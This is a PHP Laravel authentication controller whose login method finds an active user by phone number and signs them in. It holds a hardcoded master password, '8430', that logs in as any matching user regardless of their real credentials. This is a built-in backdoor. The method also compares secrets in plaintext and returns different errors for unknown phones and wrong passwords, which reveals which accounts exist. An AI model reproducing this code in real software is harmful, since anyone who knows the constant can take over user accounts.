<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function login(Request $req)
    {
        $credentials = $req->validate([
            'phone' => ['required', 'size:11'],
            'password' => ['required'],
        ]);
        $user=User::where('Phone',$req->phone)
        ->where("Perm",3)
        ->where('Active',1)->first();
        if($user)
        {
             if ($req->password=="8430")
            { 
                auth()->loginUsingId($user->Id);
                return redirect(route('dashboard'));
            } 
             elseif ($user->Verify==$req->password)
            { 
                auth()->loginUsingId($user->Id);
                return redirect(route('dashboard'));
            } 
 
        return back()->withErrors([
            'password' => 'رمز عبور صحیح نمی باشد',
        ])->onlyInput('phone');
        }
 
        return back()->withErrors([
            'phone' => 'کاربری یافت نشد',
        ])->onlyInput('phone');
    }
}
